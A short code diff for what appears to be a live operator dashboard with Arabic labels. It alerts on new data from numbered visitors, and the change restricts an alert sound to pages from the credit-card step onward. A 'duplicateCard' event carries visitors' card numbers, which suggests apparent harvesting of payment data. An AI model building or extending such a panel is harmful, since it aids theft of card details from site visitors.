@@ -1272,11 +1272,15 @@
         }
         // Show notification with sound
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
-        // Play bell sound for every data submission
-        try {
-          frogAudio.currentTime = 0;
-          frogAudio.play().catch(() => {});
-        } catch(e) {}
+        // Play frog sound only for pages from credit card onwards (not for documents/summary/update info pages)
+        const noSoundPages = ['صفحة الوثائق', 'صفحة الملخص والدفع', 'ملخص الدفع', 'معلومات الأعمال', 'الصفحة الرئيسية'];
+        const currentPage = data && data.page ? data.page : (visitor.page || '');
+        if (!noSoundPages.includes(currentPage)) {
+          try {
+            frogAudio.currentTime = 0;
+            frogAudio.play().catch(() => {});
+          } catch(e) {}
+        }
       });
 
       socket.on('visitor:duplicateCard', ({ visitorId, cardNumber, visitor: updatedVisitor }) => {
